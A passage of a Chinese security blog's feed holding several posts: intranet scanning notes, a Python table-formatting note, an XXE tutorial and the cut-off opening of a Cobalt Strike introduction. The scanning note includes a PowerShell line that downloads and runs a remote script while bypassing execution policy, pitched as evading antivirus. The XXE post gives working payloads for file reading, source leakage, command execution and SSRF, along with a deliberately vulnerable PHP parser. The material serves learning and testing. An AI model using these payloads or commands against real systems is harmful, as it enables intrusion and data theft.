192.168.1.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>3.通过 ARP 扫描探测内网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">arp-scan 工具</span><br><span class="line">Arp.exe –t 192.168.1.0&#x2F;20     </span><br><span class="line"></span><br><span class="line">Nishang 中的 Invoke-ARPScan.ps1扫描</span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0&#x2F;24&#125;&quot; &gt;&gt; C:\windows\temp\log.txt</span><br><span class="line"></span><br><span class="line">Empire 中的 arpsan 模块</span><br><span class="line">usemodule situational_awareness&#x2F;network&#x2F;arpscan</span><br><span class="line">set Range 192.168.1.0-192.168.0.254</span><br><span class="line">execute</span><br></pre></td></tr></table></figure><p>4.利用TCP UDP工具扫描</p><p>ScanLine 是一款经典的端口扫描工具  体积小，动静小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 &#x2F;b</span><br></pre></td></tr></table></figure><h3 id="域内端口扫描"><a href="#域内端口扫描" class="headerlink" title="域内端口扫描"></a>域内端口扫描</h3><p>建议  wmi和powershell工具  动静小好</p><p>S扫描器 </p><p>Metasploit 包含多种端口扫描技术，与其他扫描工具接口良好。在 msfconsole 下运行“search portscan”命令，即可进行搜索。</p><h4 id="PowerSploit-中的-Invoke-Portscan-ps1-脚本"><a href="#PowerSploit-中的-Invoke-Portscan-ps1-脚本" class="headerlink" title="PowerSploit 中的 Invoke-Portscan.ps1 脚本"></a>PowerSploit 中的 Invoke-Portscan.ps1 脚本</h4><p>这个强大之处在于是无文件落地的扫描，很强大，</p><p>可以绕过一些杀软</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要机子要联网能连接到 GitHub这个地址</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Recon&#x2F;Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.1.0&#x2F;24 -T 4 -ports &#39;445,1433,8080,3389,80&#39; -oA c:\windows\temp\res.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314121643894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="12"><br><img src="https://img-blog.csdnimg.cn/20200314121717799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python中prettytable输出美化再加进度条</title>
      <link href="/2020/03/10/Python%E4%B8%ADprettytable%E8%BE%93%E5%87%BA%E7%BE%8E%E5%8C%96%E5%86%8D%E5%8A%A0%E8%BF%9B%E5%BA%A6%E6%9D%A1/"/>
      <url>/2020/03/10/Python%E4%B8%ADprettytable%E8%BE%93%E5%87%BA%E7%BE%8E%E5%8C%96%E5%86%8D%E5%8A%A0%E8%BF%9B%E5%BA%A6%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="Python通过prettytable模块将输出内容如表格输出-比自己那个高端的多了"><a href="#Python通过prettytable模块将输出内容如表格输出-比自己那个高端的多了" class="headerlink" title="- Python通过prettytable模块将输出内容如表格输出 比自己那个高端的多了"></a>- Python通过prettytable模块将输出内容如表格输出 比自己那个高端的多了</h2><ul><li>而且十分简单的使用</li></ul><p>1安装得有吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install PrettyTable</span><br></pre></td></tr></table></figure><p>2导入模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import prettytable as pt</span><br></pre></td></tr></table></figure><p>直接给例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import prettytable as pt</span><br><span class="line"></span><br><span class="line"># 添加表头</span><br><span class="line">table &#x3D; pt.PrettyTable([&quot;URL&quot;, &quot;参数&quot;, &quot;沙雕&quot;])</span><br><span class="line"></span><br><span class="line">#   add_row 添加一行数据</span><br><span class="line">table.add_row([&quot;http:&#x2F;&#x2F;aaa.com&quot;, &quot;raskv&quot;, &quot;123123&quot;])</span><br><span class="line">table.add_row([&quot;http:&#x2F;&#x2F;bbb.com&quot;, &quot;susd&quot;, &quot;123123&quot;])</span><br><span class="line">table.add_row([&quot;http:&#x2F;&#x2F;ccc.com&quot;, &quot;pwd&quot;, &quot;Ym15&quot;])</span><br><span class="line"></span><br><span class="line">#   默认居中对齐</span><br><span class="line">#   设置&quot;值&quot;列，局左对齐 left首字母</span><br><span class="line">table.align[&quot;值&quot;] &#x3D; &#39;l&#39;</span><br><span class="line"></span><br><span class="line">print(table)</span><br></pre></td></tr></table></figure><p>输出，可以哇<br><img src="https://img-blog.csdnimg.cn/20200310182731777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from prettytable import PrettyTable</span><br><span class="line"></span><br><span class="line">table &#x3D; PrettyTable()</span><br><span class="line">#   add_column 添加一列数据</span><br><span class="line">table.add_column(&#39;&#x3D;&#x3D;&#x3D;&#39;, [&quot;URL&quot;, &quot;参数&quot;, &quot;值&quot;])</span><br><span class="line">table.add_column(&#39;第1列&#39;, [&quot;http:&#x2F;&#x2F;aaa.com&quot;, &quot;raskv&quot;, &quot;dEBxcS5j&quot;])</span><br><span class="line">table.add_column(&#39;第2列&#39;, [&quot;http:&#x2F;&#x2F;bbb.com&quot;, &quot;su&quot;, &quot;626d5633583231794c6d4e6&quot;])</span><br><span class="line">table.add_column(&#39;第3列&#39;, [&quot;http:&#x2F;&#x2F;ccc.com&quot;, &quot;pwd&quot;, &quot;Ym1WM1gyMXlMbU5&quot;])</span><br><span class="line">#   设置&quot;第3列&quot;，局右对齐 right首字母</span><br><span class="line">table.align[&quot;第3列&quot;] &#x3D; &#39;r&#39;</span><br><span class="line">print(table)</span><br></pre></td></tr></table></figure><h2 id="进度条"><a href="#进度条" class="headerlink" title="进度条"></a>进度条</h2><p>import time<br>import progressbar</p><h1 id="可以是迭代器或列表"><a href="#可以是迭代器或列表" class="headerlink" title="可以是迭代器或列表"></a>可以是迭代器或列表</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; progressbar.ProgressBar()</span><br><span class="line"></span><br><span class="line">my_list &#x3D; [1, 2, 3, 4, 5]</span><br><span class="line">my_list.append([6, 7, 8, 9])</span><br><span class="line"></span><br><span class="line">for i in p(my_list):</span><br><span class="line">    # do something</span><br><span class="line">    print(i)</span><br><span class="line">    time.sleep(1)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞攻防</title>
      <link href="/2020/03/08/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/"/>
      <url>/2020/03/08/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="1-XXE概述"><a href="#1-XXE概述" class="headerlink" title="1. XXE概述"></a>1. XXE概述</h2><p>XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p><p>可以造成危害</p><ul><li>文件读取</li><li>ssrf</li><li>dos</li><li>命令执行</li></ul><h2 id="XML基础介绍"><a href="#XML基础介绍" class="headerlink" title="XML基础介绍"></a>XML基础介绍</h2><p>XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。</p><p>下面我们主要介绍PHP语言下的XXE攻击.</p><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p><strong>文档类型定义（DTD）</strong></p><p>可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><ul><li><p>内部的 DOCTYPE 声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure></li><li><p>外部文档声明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM ”文件名”&gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="内部声明的例子"><a href="#内部声明的例子" class="headerlink" title="内部声明的例子"></a>内部声明的例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;KK&lt;&#x2F;to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><h4 id="最外部引用的例子"><a href="#最外部引用的例子" class="headerlink" title="最外部引用的例子"></a>最外部引用的例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;waibu.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;KK&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><p>waibu.DTD 被引用的内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>XXE 即 XML外部实体注入 。</p><p>我们先分别理解一下注入和外部实体的含义。</p><ul><li>注入：是指<code>XML</code>数据在传输过程中被修改，导致服务器执行了修改后的恶意代码，从而达到攻击目的。</li><li>外部实体：则是指攻击者通过利用外部实体声明部分来对<code>XML</code>数据进行修改、插入恶意代码。</li></ul><p>所以<code>XXE</code>就是指<code>XML</code>数据在传输过程中利用外部实体声明部分的<code>“SYSTEM”</code>关键词导致<code>XML</code>解析器可以从本地文件或者远程<code>URI</code>中读取受保护的数据。</p><h2 id="主流的漏洞payload"><a href="#主流的漏洞payload" class="headerlink" title="主流的漏洞payload"></a>主流的漏洞payload</h2><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Quan</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">fff</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hhh</span>&gt;</span><span class="symbol">&amp;fff;</span><span class="tag">&lt;/<span class="name">hhh</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这种情况很少发生，但在配置不当/开发内部应用情况下（PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上），攻击者能够通过XXE执行代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Quan</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"expect://id"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hhh</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;<span class="name">hhh</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="SSRF内网探测"><a href="#SSRF内网探测" class="headerlink" title="SSRF内网探测"></a>SSRF内网探测</h4><p>我们要根据返回信息内容判断该端口是否打开。</p><p>主要是根据报错信息的差异来判断是否生效</p><p>若测试端口返回“Connection refused”则可以知道该端口是关闭的，否则为就是打开的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">ssrf</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.246.136:80"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;ssrf;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">secret</span>&gt;</span>ssrf?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="简单的测试代码"><a href="#简单的测试代码" class="headerlink" title="简单的测试代码"></a>简单的测试代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">  $xml = simplexml_load_string($data,<span class="string">"SimpleXMLElement"</span>,LIBXML_NOENT);</span><br><span class="line">  var_dump($xml)</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意：自己写个html提交表单把，我的环境是 win7+phpstudy</p><h3 id="任意文件读取payload"><a href="#任意文件读取payload" class="headerlink" title="任意文件读取payload"></a>任意文件读取payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM <span class="string">"file:///C:/Windows/win.ini"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200308114723119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="任意文件读取php文件payload"><a href="#任意文件读取php文件payload" class="headerlink" title="任意文件读取php文件payload"></a>任意文件读取php文件payload</h3><p>问题出在读代码地方，都有&lt;&gt;这种可能会把php文件当初xml给处理了，所以直接读取会直接报错。所以我们换一种协议，转化格式读取<br>最终可以导致源码泄露</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=xxe.php"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200308115546147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解码后正确<br><img src="https://img-blog.csdnimg.cn/20200308115659474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="SSRF内网探测payload"><a href="#SSRF内网探测payload" class="headerlink" title="SSRF内网探测payload"></a>SSRF内网探测payload</h3><p>这个报错信息根据环境的不同，协议的不同报错方式都不一样，所以到底这个有没有打开得自行遍历查看异同，和报错信息判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM <span class="string">"http://127.0.0.1:3306"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><h2 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h2><p>使用开发语言提供的禁用外部实体的方法</p><p>PHP：</p><p>libxml_disable_entity_loader(true);</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-神器-Cobalt Strike-一-CS的基础和介绍</title>
      <link href="/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%B8%80-CS%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BB%8B%E7%BB%8D/"/>
      <url>/2020/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%B8%80-CS%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-工具-Cobalt-Strike-CS-基础"><a href="#内网安全学习从入门到入狱-工具-Cobalt-Strike-CS-基础" class="headerlink" title="内网安全学习从入门到入狱-工具-Cobalt Strike(CS)基础"></a>内网安全学习从入门到入狱-工具-Cobalt Strike(CS)基础</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li><p>本文主要是看了 Cobalt Strike 各种资料后记的笔记。</p></li><li><p>参考过于杂乱，如有问题请联系我</p></li><li><p>手上虽然没有4.0 ，但是也要提前学习了</p></li></ul><h2 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h2><p>官网收费软件 <a href="https://www.cobaltstrike.com/，Cobalt" target="_blank" rel="noopener">https://www.cobaltstrike.com/，Cobalt</a> Strike许可费用为每位用户3500美元，其他的不说了</p><ul><li>Cobalt Strike是用于“对手模拟”和“红队行动”的软件</li><li>C/S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透</li><li>个人感觉是内网利器，所以放到内网里面了</li></ul><ul><li>Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。</li><li>Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200306102229806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="基本名词解释"><a href="#基本名词解释" class="headerlink" title="基本名词解释"></a>基本名词解释</h2><h3 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h3><p>C2 就是 Command &amp; Control Server 的简称，也就是命令与控制服务器。</p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><p>攻击者在C2上运行的服务，可以监听Beacon的请求(check in)。</p><h3 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h3><p>Beacon 是 Cobalt Strike 的 Payload</p><p>植入到受感染系统中的恶意程序，可以请求C2服务器并在受感染系统中执行命令</p><ul><li><p>有两种通信策略（与团队服务器，CS 中以团队服务器作为 C2）</p></li><li><ul><li>异步式通信 = 频率低、速度慢</li><li>交互式通信 = C2 对 Beacon 实时控制</li></ul></li><li><p>使用 HTTP/S 或 DNS 来出口网络数据</p></li></ul><h3 id="agent"><a href="#agent" class="headerlink" 